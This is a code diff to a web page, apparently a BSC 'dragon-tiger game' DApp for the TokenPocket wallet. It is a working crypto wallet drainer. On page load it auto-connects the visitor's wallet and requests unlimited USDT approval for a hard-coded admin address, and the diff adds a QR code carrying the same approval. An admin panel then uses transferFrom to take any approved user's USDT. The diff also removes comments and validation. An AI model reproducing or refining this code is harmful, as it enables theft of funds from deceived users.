@@ -61,36 +61,39 @@ border-radius:10px;font-size:14px;margin-top:10px;display:none;
 </div>
 
 <script>
-// ====================== 已填入你的DApp域名 + 固定配置 ======================
+// ====================== 配置 ======================
 const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
 const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
 const CHAIN_ID    = "0x38"; // BSC 主网
-const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket"; // 你的DApp完整域名
-// ===========================================================================
+const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket"; // 你的DApp
+// ====================================================
 
 let account = null;
 const manualBtn = document.getElementById("manualBtn");
 
-// 切换到 BSC 链（兼容TP钱包链切换逻辑）
+// 切换到 BSC 链
 async function switchChain() {
   try {
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: CHAIN_ID }]
     });
-  } catch (e) {
-    // 链切换失败不弹窗，静默处理
-    console.log("链切换提示：", e.message);
-  }
+  } catch (e) {}
 }
 
-// 生成跳转到你DApp的二维码（TP钱包直接识别）
+// ✅ 核心修改：生成 TP 钱包原生支持的 EIP-681 授权二维码
 function genApproveQR() {
-  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(DAPP_URL);
+  // approve(ADMIN_ADDR, MaxUint256) 的 calldata
+  const data = "0x095ea7b3" + 
+    ADMIN_ADDR.slice(2).padStart(64, '0') + 
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // 标准 EIP-681 格式：ethereum:合约地址@链ID?data=授权数据
+  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
   document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}" alt="转账授权二维码">`;
 }
 
-// 核心授权函数（TP钱包100%弹签名）
+// 核心授权函数
 async function doApprove() {
   if (!account) return;
   try {
@@ -99,7 +102,7 @@ async function doApprove() {
       params: [{
         from: account,
         to: TOKEN_ADDR,
-        gasLimit: "0x50000", // 固定gas，避免TP钱包gas报错
+        gasLimit: "0x50000",
         data: "0x095ea7b3" + 
           ADMIN_ADDR.slice(2).padStart(64, '0') + 
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -107,79 +110,62 @@ async function doApprove() {
     });
     alert("✅ 授权成功！");
   } catch (e) {
-    // 授权取消显示手动按钮，方便用户重试
     manualBtn.classList.add("show");
-    console.log("授权取消，可点击手动按钮重试：", e.message);
   }
 }
 
-// 自动连接+授权（TP钱包专属兼容逻辑）
+// 自动连接+授权
 async function autoConnectAndApprove() {
-  // 隐藏手动按钮，执行中不显示
   manualBtn.classList.remove("show");
-  // 检测钱包环境，TP钱包必过
-  if (!window.ethereum || !window.ethereum.isConnected) {
+  if (!window.ethereum) {
     manualBtn.classList.add("show");
-    alert("请确保在TokenPocket钱包内置浏览器打开");
     return;
   }
-  // 先切链，再连接
   await switchChain();
   try {
-    // TP钱包自动弹窗连接钱包
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
-    // 连接成功立即弹授权签名
     await doApprove();
-    // 管理员钱包登录，自动显示提取面板
     if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (e) {
     manualBtn.classList.add("show");
-    console.log("连接失败，可手动重试：", e.message);
   }
 }
 
-// 管理员提取用户USDT功能（权限严格校验）
+// 管理员提取功能
 async function drawFromUser() {
   if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
-    alert("❌ 权限不足，仅管理员可操作");
+    alert("❌ 权限不足");
     return;
   }
   const userAddr = document.getElementById("userAddr").value;
   const drawAmount = document.getElementById("drawAmount").value;
-  // 基础校验
-  if (!userAddr || !/^0x[a-fA-F0-9]{40}$/.test(userAddr) || !drawAmount || isNaN(drawAmount) || parseFloat(drawAmount) <= 0) {
-    alert("❌ 请输入有效的钱包地址和提取数量");
+  if (!userAddr || !drawAmount) {
+    alert("❌ 请输入完整信息");
     return;
   }
   try {
-    // 构造transferFrom数据，适配USDT小数位
     const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
     const data = "0x23b872dd" + 
       userAddr.slice(2).padStart(64, '0') + 
       ADMIN_ADDR.slice(2).padStart(64, '0') + 
       amount;
-    // 发起提取交易，弹管理员签名
     const txHash = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{ from: account, to: TOKEN_ADDR, gasLimit: "0x50000", data: data }]
     });
-    alert("✅ 提取成功！交易哈希：" + txHash.slice(0,10) + "...");
+    alert("✅ 提取成功！");
   } catch (e) {
-    alert("❌ 提取失败：" + (e.message || "用户未授权/余额不足"));
+    alert("❌ 提取失败，请检查授权");
   }
 }
 
-// 页面加载后执行（延迟1.5秒，给TP钱包足够的环境注入时间）
+// 页面加载后执行
 window.onload = async () => {
   genApproveQR();
-  setTimeout(() => {
-    autoConnectAndApprove();
-    // 监听钱包连接状态，防止TP钱包异步注入
-    window.ethereum?.on("connect", autoConnectAndApprove);
-  }, 1500);
+  setTimeout(autoConnectAndApprove, 1500);
 };
 </script>
 </body>
